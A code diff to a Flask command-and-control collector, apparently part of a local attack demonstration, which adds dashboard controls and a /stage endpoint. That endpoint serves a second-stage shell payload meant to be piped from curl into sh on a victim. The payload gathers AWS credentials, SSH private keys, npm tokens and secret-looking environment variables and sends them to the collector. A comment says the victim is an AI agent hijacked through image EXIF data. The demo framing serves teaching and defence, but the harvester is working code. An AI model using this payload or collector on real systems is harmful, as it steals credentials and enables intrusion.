@@ -13,6 +13,7 @@ from flask import Flask, request, Response
 app = Flask(__name__)
 PORT = int(os.environ.get("PORT", "8080"))
 LOOT = []  # in-memory; also appended to /data/loot.jsonl
+_seq = 0   # monotonic id so the UI can delete a single beacon
 
 
 def _persist(entry):
@@ -39,7 +40,10 @@ def collect():
     if not isinstance(body, dict):
         # valid JSON but not an object (number/str/list), or undecodable → wrap it
         body = {"raw": body if body is not None else raw.decode("utf-8", "replace")}
+    global _seq
+    _seq += 1
     entry = {
+        "id": _seq,
         "received": datetime.now(timezone.utc).strftime("%H:%M:%S UTC"),
         "src": request.headers.get("X-Forwarded-For", request.remote_addr),
         "host": body.get("host"),
@@ -55,6 +59,33 @@ def collect():
 def reset():
     LOOT.clear()
     return {"status": "cleared"}, 200
+
+
+@app.route("/delete/<int:eid>", methods=["GET", "POST"])
+def delete(eid):
+    global LOOT
+    LOOT = [e for e in LOOT if e.get("id") != eid]
+    return {"status": "deleted", "remaining": len(LOOT)}, 200
+
+
+# Second-stage harvester the "C2" serves — fetched and run by a hijacked victim
+# (curl .../stage | sh), exactly like real malware pulls stage-2 from its server
+# (cf. ethers-provider2). It sweeps the victim's PLANTED FAKE secrets and beacons
+# them back to /collect — the same inbox the npm demo feeds, which keeps appending.
+STAGE = (
+    "#!/bin/sh\n"
+    "python3 -c 'import os,json,socket,urllib.request as u; "
+    "files={p:open(p).read().strip() for p in [\"/root/.aws/credentials\",\"/root/.ssh/id_rsa\",\"/root/.npmrc\"] if os.path.exists(p)}; "
+    "env={k:v for k,v in os.environ.items() if any(s in k.upper() for s in [\"KEY\",\"TOKEN\",\"SECRET\",\"PASS\"])}; "
+    "d={\"host\":socket.gethostname(),\"user\":os.getenv(\"USER\",\"root\"),\"via\":\"agent image-hijack (EXIF)\",\"loot\":{**env,**files}}; "
+    "u.urlopen(u.Request(\"http://demo-collector:8080/collect\",json.dumps(d).encode(),{\"Content-Type\":\"application/json\"})); "
+    "print(\"exfil sent:\",len(d[\"loot\"]),\"items to the attacker\")'\n"
+)
+
+
+@app.route("/stage")
+def stage():
+    return Response(STAGE, mimetype="text/x-shellscript")
 
 
 @app.route("/api/loot")
@@ -80,11 +111,16 @@ h1{font-size:20px;letter-spacing:.14em;color:var(--red)}
 .loot{display:grid;grid-template-columns:140px 1fr;gap:4px 14px;font-size:12.5px;align-items:start}
 .k{color:var(--red);white-space:nowrap}.v{color:var(--txt);white-space:pre-wrap;word-break:break-all}
 .tag{display:inline-block;background:#2a1113;color:var(--red);border:1px solid #512;border-radius:5px;padding:1px 7px;font-size:10px;letter-spacing:.08em}
+.del{margin-left:auto;background:transparent;border:1px solid var(--edge);color:var(--dim);border-radius:6px;padding:1px 9px;cursor:pointer;font-family:var(--mono);font-size:12px;line-height:1.4}
+.del:hover{color:var(--red);border-color:#512}
+.clear{margin-left:14px;align-self:center;background:transparent;border:1px solid var(--edge);color:var(--dim);border-radius:7px;padding:5px 11px;font-family:var(--mono);font-size:11px;cursor:pointer}
+.clear:hover{color:var(--red);border-color:#512}
 </style></head><body>
 <header><h1>▶ ATTACKER INBOX</h1>
 <div><div class=count id=count>0<small> SECRETS CAPTURED</small></div></div>
-<div class=sub>local collector · demo-collector:8080<br>realistic mechanism · nothing leaves the machine</div></header>
-<div id=list><div class=empty>waiting for a beacon… run <b>npm install</b> on the victim</div></div>
+<div class=sub>local collector · demo-collector:8080<br>realistic mechanism · nothing leaves the machine</div>
+<button class=clear onclick="clearAll()">clear all</button></header>
+<div id=list><div class=empty>waiting for a victim's beacon…</div></div>
 <script>
 function esc(s){return String(s==null?'':s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}
 function render(d){
@@ -99,10 +135,13 @@ function render(d){
     return '<div class=card><div class=meta><span class=tag>EXFIL</span>'+
       '<span>'+esc(e.received)+'</span>'+
       '<span>victim <b>'+esc(e.user||'?')+'@'+esc(e.host||'?')+'</b></span>'+
-      '<span>src '+esc(e.src||'?')+'</span></div>'+
+      '<span>src '+esc(e.src||'?')+'</span>'+
+      '<button class=del onclick="del('+e.id+')" title="delete this beacon">✕</button></div>'+
       '<div class=loot>'+(rows||'<div class=v>'+esc(JSON.stringify(e.beacon))+'</div>')+'</div></div>';
   }).join('');
 }
+async function del(id){try{await fetch('/delete/'+id,{method:'POST'})}catch(e){} last=-1; poll();}
+async function clearAll(){if(!confirm('Clear the whole inbox?'))return; try{await fetch('/reset',{method:'POST'})}catch(e){} last=-1; poll();}
 let last=-1;
 async function poll(){try{const r=await fetch('/api/loot');const d=await r.json();
   if(d.count!==last){last=d.count;render(d)}}catch(e){}}
